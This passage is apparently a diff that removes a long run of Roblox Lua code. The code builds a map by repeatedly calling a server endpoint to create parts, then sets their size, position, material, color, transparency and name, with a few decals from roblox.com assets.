-			resize(pt,Vector3.new(11.899798393249512,0.05000000074505806,4.249894618988037),CFrame.new(-173.65447998046875,44.274383544921875,-30.09490966796875)*CFrame.Angles(math.rad(0),math.rad(60.277000427246094),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(13,105,172))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-173.65447998046875,44.37438201904297,-30.09490966796875),workspace)
-			resize(pt,Vector3.new(11.899798393249512,0.15000000596046448,4.3998942375183105),CFrame.new(-173.65447998046875,44.37438201904297,-30.09490966796875)*CFrame.Angles(math.rad(0),math.rad(60.277000427246094),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(188,155,93))
-			setanchor(pt,true)
-			setname(pt,"Light")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-173.36932373046875,43.2493896484375,-30.5943603515625),workspace)
-			resize(pt,Vector3.new(10.599793434143066,2.099971294403076,2.3998939990997314),CFrame.new(-173.36932373046875,43.2493896484375,-30.5943603515625)*CFrame.Angles(math.rad(0),math.rad(60.277000427246094),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(160,86,36))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-172.74960327148438,41.649391174316406,-31.680023193359375),workspace)
-			resize(pt,Vector3.new(13.099787712097168,1.099971055984497,3.8998942375183105),CFrame.new(-172.74960327148438,41.649391174316406,-31.680023193359375)*CFrame.Angles(math.rad(0),math.rad(60.277000427246094),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(160,86,36))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-171.0657958984375,57.29932403564453,-47.9993896484375),workspace)
-			resize(pt,Vector3.new(1.600000023841858,6.500000476837158,1.600000023841858),CFrame.new(-171.0657958984375,57.29932403564453,-47.9993896484375)*CFrame.Angles(math.rad(0),math.rad(0.28200000524520874),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(248,248,248))
-			setanchor(pt,true)
-			setname(pt,"Light")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-171.0657958984375,60.624717712402344,-48.000396728515625),workspace)
-			resize(pt,Vector3.new(1.1000374555587769,0.05000000074505806,1.100000023841858),CFrame.new(-171.0657958984375,60.624717712402344,-48.000396728515625)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(180)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(254,243,187))
-			setanchor(pt,true)
-			setname(pt,"Smooth Block Model")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-171.0194091796875,57.29932403564453,-38.49951171875),workspace)
-			resize(pt,Vector3.new(1.600000023841858,6.500000476837158,1.600000023841858),CFrame.new(-171.0194091796875,57.29932403564453,-38.49951171875)*CFrame.Angles(math.rad(0),math.rad(0.28200000524520874),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(248,248,248))
-			setanchor(pt,true)
-			setname(pt,"Light")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-171.0194091796875,60.624725341796875,-38.500518798828125),workspace)
-			resize(pt,Vector3.new(1.1000374555587769,0.05000000074505806,1.100000023841858),CFrame.new(-171.0194091796875,60.624725341796875,-38.500518798828125)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(180)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(254,243,187))
-			setanchor(pt,true)
-			setname(pt,"Smooth Block Model")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-170.94473266601562,60.624725341796875,-23.200592041015625),workspace)
-			resize(pt,Vector3.new(1.1000374555587769,0.05000000074505806,1.100000023841858),CFrame.new(-170.94473266601562,60.624725341796875,-23.200592041015625)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(180)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(254,243,187))
-			setanchor(pt,true)
-			setname(pt,"Smooth Block Model")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-170.9444580078125,57.29932403564453,-23.149688720703125),workspace)
-			resize(pt,Vector3.new(1.600000023841858,6.500000476837158,1.600000023841858),CFrame.new(-170.9444580078125,57.29932403564453,-23.149688720703125)*CFrame.Angles(math.rad(0),math.rad(0.28200000524520874),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(248,248,248))
-			setanchor(pt,true)
-			setname(pt,"Light")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-170.86648559570312,57.29932403564453,-7.19989013671875),workspace)
-			resize(pt,Vector3.new(1.600000023841858,6.500000476837158,1.600000023841858),CFrame.new(-170.86648559570312,57.29932403564453,-7.19989013671875)*CFrame.Angles(math.rad(0),math.rad(0.28200000524520874),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(248,248,248))
-			setanchor(pt,true)
-			setname(pt,"Light")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-162.1329345703125,42.13640594482422,-7.9757080078125),workspace)
-			resize(pt,Vector3.new(0.7360836267471313,0.8659809231758118,1.7319618463516235),CFrame.new(-162.1329345703125,42.13640594482422,-7.9757080078125)*CFrame.Angles(math.rad(0),math.rad(-90),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(27,42,53))
-			setanchor(pt,true)
-			setname(pt,"Seat")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-160.94485473632812,44.649391174316406,-53.67010498046875),workspace)
-			resize(pt,Vector3.new(0.19978094100952148,1.5999690294265747,1.4998950958251953),CFrame.new(-160.94485473632812,44.649391174316406,-53.67010498046875)*CFrame.Angles(math.rad(0),math.rad(60.277000427246094),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(50,50,50))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-160.59744262695312,43.024391174316406,-53.47161865234375),workspace)
-			resize(pt,Vector3.new(0.19978094100952148,1.649970293045044,2.299894332885742),CFrame.new(-160.59744262695312,43.024391174316406,-53.47161865234375)*CFrame.Angles(math.rad(0),math.rad(60.277000427246094),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(50,50,50))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-164.96054077148438,44.649391174316406,-46.635650634765625),workspace)
-			resize(pt,Vector3.new(0.19978094100952148,1.5999690294265747,1.4998950958251953),CFrame.new(-164.96054077148438,44.649391174316406,-46.635650634765625)*CFrame.Angles(math.rad(0),math.rad(60.277000427246094),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(50,50,50))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-164.61306762695312,42.99939727783203,-46.437408447265625),workspace)
-			resize(pt,Vector3.new(0.19978031516075134,1.5999703407287598,2.299894332885742),CFrame.new(-164.61306762695312,42.99939727783203,-46.437408447265625)*CFrame.Angles(math.rad(0),math.rad(60.277000427246094),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(50,50,50))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-164.27557373046875,44.539222717285156,-46.244415283203125),workspace)
-			resize(pt,Vector3.new(0.19978031516075134,1.7499700784683228,0.4498937129974365),CFrame.new(-164.27557373046875,44.539222717285156,-46.244415283203125)*CFrame.Angles(math.rad(-14.996999740600586),math.rad(60.279998779296875),math.rad(-0.0010000000474974513)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(50,50,50))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-161.09225463867188,60.674400329589844,-18.110565185546875),workspace)
-			resize(pt,Vector3.new(84.99982452392578,0.05000000074505806,65.59991455078125),CFrame.new(-161.09225463867188,60.674400329589844,-18.110565185546875)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(50,50,50))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-162.10012817382812,44.590972900390625,-49.66571044921875),workspace)
-			resize(pt,Vector3.new(7.899782180786133,1.7499700784683228,0.05000000074505806),CFrame.new(-162.10012817382812,44.590972900390625,-49.66571044921875)*CFrame.Angles(math.rad(-14.996999740600586),math.rad(60.279998779296875),math.rad(-0.0010000000474974513)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0.800000011920929)
-			color(pt,Color3.fromRGB(163,162,165))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-163.58865356445312,42.93943786621094,-45.85223388671875),workspace)
-			resize(pt,Vector3.new(0.19978031516075134,1.7499700784683228,0.4498937129974365),CFrame.new(-163.58865356445312,42.93943786621094,-45.85223388671875)*CFrame.Angles(math.rad(-14.996999740600586),math.rad(60.279998779296875),math.rad(-0.0010000000474974513)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(50,50,50))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-163.5823974609375,44.599388122558594,-50.511962890625),workspace)
-			resize(pt,Vector3.new(7.899785041809082,1.4999691247940063,0.05000000074505806),CFrame.new(-163.5823974609375,44.599388122558594,-50.511962890625)*CFrame.Angles(math.rad(0),math.rad(60.277000427246094),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0.800000011920929)
-			color(pt,Color3.fromRGB(163,162,165))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-163.51715087890625,42.99939727783203,-50.475250244140625),workspace)
-			resize(pt,Vector3.new(7.899781227111816,1.5999703407287598,0.19989356398582458),CFrame.new(-163.51715087890625,42.99939727783203,-50.475250244140625)*CFrame.Angles(math.rad(0),math.rad(60.277000427246094),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(50,50,50))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-161.19406127929688,42.49939727783203,-49.148895263671875),workspace)
-			resize(pt,Vector3.new(7.899779796600342,0.1999700963497162,0.05000000074505806),CFrame.new(-161.19406127929688,42.49939727783203,-49.148895263671875)*CFrame.Angles(math.rad(0),math.rad(60.277000427246094),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0.800000011920929)
-			color(pt,Color3.fromRGB(163,162,165))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-161.23748779296875,42.29939270019531,-49.1737060546875),workspace)
-			resize(pt,Vector3.new(8.29978084564209,0.1999700963497162,0.15000000596046448),CFrame.new(-161.23748779296875,42.29939270019531,-49.1737060546875)*CFrame.Angles(math.rad(0),math.rad(60.277000427246094),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(50,50,50))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-160.81863403320312,59.14940643310547,-8.1617431640625),workspace)
-			resize(pt,Vector3.new(4.399798393249512,2.099970817565918,3.649892807006836),CFrame.new(-160.81863403320312,59.14940643310547,-8.1617431640625)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(50,50,50))
-			setanchor(pt,true)
-			setname(pt,"Part")
-			createdecal(pt,Enum.NormalId.Back)
-			setdecal(pt,"http://www.roblox.com/asset/?id=2752483",Enum.NormalId.Back)
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-160.68209838867188,50.599403381347656,24.913040161132812),workspace)
-			resize(pt,Vector3.new(0.44999998807907104,17.39996337890625,9.899884223937988),CFrame.new(-160.68209838867188,50.599403381347656,24.913040161132812)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(105,102,92))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-162.95269775390625,45.324378967285156,-50.15289306640625),workspace)
-			resize(pt,Vector3.new(7.899777412414551,0.05000000074505806,0.19989505410194397),CFrame.new(-162.95269775390625,45.324378967285156,-50.15289306640625)*CFrame.Angles(math.rad(0),math.rad(60.277000427246094),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(255,255,204))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-162.95269775390625,45.399383544921875,-50.15289306640625),workspace)
-			resize(pt,Vector3.new(7.899777412414551,0.10000000149011612,1.4998950958251953),CFrame.new(-162.95269775390625,45.399383544921875,-50.15289306640625)*CFrame.Angles(math.rad(0),math.rad(60.277000427246094),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(50,50,50))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-162.87371826171875,44.5660400390625,-50.107818603515625),workspace)
-			resize(pt,Vector3.new(7.899777412414551,0.05000000074505806,0.19989505410194397),CFrame.new(-162.87371826171875,44.5660400390625,-50.107818603515625)*CFrame.Angles(math.rad(5.000999927520752),math.rad(60.28300094604492),math.rad(-0.0020000000949949026)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(255,255,204))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-162.86807250976562,44.64075469970703,-50.104583740234375),workspace)
-			resize(pt,Vector3.new(7.899777412414551,0.10000000149011612,1.4998950958251953),CFrame.new(-162.86807250976562,44.64075469970703,-50.104583740234375)*CFrame.Angles(math.rad(5.000999927520752),math.rad(60.28300094604492),math.rad(-0.0020000000949949026)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(50,50,50))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-162.86767578125,59.174407958984375,-17.689697265625),workspace)
-			resize(pt,Vector3.new(2.200038433074951,83.46710205078125,2.199962615966797),CFrame.new(-162.86767578125,59.174407958984375,-17.689697265625)*CFrame.Angles(math.rad(0),math.rad(90.28199768066406),math.rad(-90)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(50,50,50))
-			setanchor(pt,true)
-			setname(pt,"Smooth Block Model")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-162.0831298828125,42.13640594482422,2.224212646484375),workspace)
-			resize(pt,Vector3.new(0.7360836267471313,0.8659809231758118,1.7319618463516235),CFrame.new(-162.0831298828125,42.13640594482422,2.224212646484375)*CFrame.Angles(math.rad(0),math.rad(-90),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(27,42,53))
-			setanchor(pt,true)
-			setname(pt,"Seat")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-161.01126098632812,59.14940643310547,-47.61114501953125),workspace)
-			resize(pt,Vector3.new(4.399798393249512,2.099970817565918,3.649892807006836),CFrame.new(-161.01126098632812,59.14940643310547,-47.61114501953125)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(50,50,50))
-			setanchor(pt,true)
-			setname(pt,"Part")
-			createdecal(pt,Enum.NormalId.Back)
-			setdecal(pt,"http://www.roblox.com/asset/?id=2752483",Enum.NormalId.Back)
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-162.1856689453125,42.13640594482422,-18.775543212890625),workspace)
-			resize(pt,Vector3.new(0.7360836267471313,0.8659809231758118,1.7319618463516235),CFrame.new(-162.1856689453125,42.13640594482422,-18.775543212890625)*CFrame.Angles(math.rad(0),math.rad(-90),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,1)
-			color(pt,Color3.fromRGB(27,42,53))
-			setanchor(pt,true)
-			setname(pt,"Seat")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-160.260009765625,44.539222717285156,-53.279083251953125),workspace)
-			resize(pt,Vector3.new(0.19978031516075134,1.7499700784683228,0.4498937129974365),CFrame.new(-160.260009765625,44.539222717285156,-53.279083251953125)*CFrame.Angles(math.rad(-14.996999740600586),math.rad(60.279998779296875),math.rad(-0.0010000000474974513)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(50,50,50))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-162.61764526367188,43.799415588378906,-49.93267822265625),workspace)
-			resize(pt,Vector3.new(8.24978256225586,0.10000000149011612,2.299893856048584),CFrame.new(-162.61764526367188,43.799415588378906,-49.93267822265625)*CFrame.Angles(math.rad(0),math.rad(60.277000427246094),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(50,50,50))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-162.51846313476562,43.72438049316406,-49.90509033203125),workspace)
-			resize(pt,Vector3.new(7.899777412414551,0.05000000074505806,0.19989505410194397),CFrame.new(-162.51846313476562,43.72438049316406,-49.90509033203125)*CFrame.Angles(math.rad(0),math.rad(60.277000427246094),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(255,255,204))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-162.38812255859375,41.39939880371094,-49.83056640625),workspace)
-			resize(pt,Vector3.new(8.29978084564209,1.5999703407287598,2.799893856048584),CFrame.new(-162.38812255859375,41.39939880371094,-49.83056640625)*CFrame.Angles(math.rad(0),math.rad(60.277000427246094),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(50,50,50))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-159.88916015625,40.54942321777344,-17.491241455078125),workspace)
-			resize(pt,Vector3.new(83.84977722167969,0.10000000149011612,65.59986114501953),CFrame.new(-159.88916015625,40.54942321777344,-17.491241455078125)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(106,57,9))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-159.68466186523438,50.599403381347656,24.383010864257812),workspace)
-			resize(pt,Vector3.new(0.599822998046875,20.199966430664062,66.99989318847656),CFrame.new(-159.68466186523438,50.599403381347656,24.383010864257812)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(17,17,17))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-159.572998046875,42.93943786621094,-52.886871337890625),workspace)
-			resize(pt,Vector3.new(0.19978031516075134,1.7499701976776123,0.4498937129974365),CFrame.new(-159.572998046875,42.93943786621094,-52.886871337890625)*CFrame.Angles(math.rad(-14.996999740600586),math.rad(60.279998779296875),math.rad(-0.0010000000474974513)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(50,50,50))
-			setanchor(pt,true)
-			setname(pt,"Part")
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-145.94284057617188,42.04945373535156,-62.8355712890625),workspace)
-			resize(pt,Vector3.new(0.10000000149011612,3.100001096725464,15.100003242492676),CFrame.new(-145.94284057617188,42.04945373535156,-62.8355712890625)*CFrame.Angles(math.rad(0),math.rad(-89.72100067138672),math.rad(0)))
-			syncmaterial(pt,Enum.Material.Concrete)
-			transparency(pt,0)
-			color(pt,Color3.fromRGB(204,142,105))
-			setanchor(pt,true)
-			setname(pt,"Part")
-			createdecal(pt,Enum.NormalId.Right)
-			setdecal(pt,"http://www.roblox.com/asset/?id=147149580",Enum.NormalId.Right)
-			transparency(pt,0.8999999761581421)
-		end)
-		if not ok then errors=errors+1; warn("[MAP] err:"..tostring(err)) end
-		done=done+1
-	end)
-	spawn(function()
-		local ok,err = pcall(function()
-			local pt = serverendpoint:InvokeServer("CreatePart","Normal",CFrame.new(-145.71963500976562,60.624725341796875,-38.6239013671875),workspace)
-			resize(pt,Vector3.new(1.1000374555587769,0.05000000074505806,1.100000023841858),CFrame.new(-145.71963500976562,60.624725341796875,-38.6239013671875)*CFrame.Angles(math.rad(0),math.rad(90.27899932861328),math.rad(180)))
-			syncmaterial(pt,Enum.Material.Concrete)
